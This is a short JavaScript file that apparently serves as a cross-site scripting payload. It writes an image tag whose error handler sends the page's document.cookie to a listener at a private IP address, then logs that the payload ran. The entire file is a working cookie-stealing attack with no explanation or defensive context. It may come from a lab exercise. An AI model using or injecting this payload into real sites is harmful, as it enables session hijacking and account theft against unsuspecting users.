function xssPayload() {
  document.write("<img src=x onerror=this.src='http://192.168.190.130/?'+document.cookie;>")

}

console.log('XSS payload executed');
xssPayload();
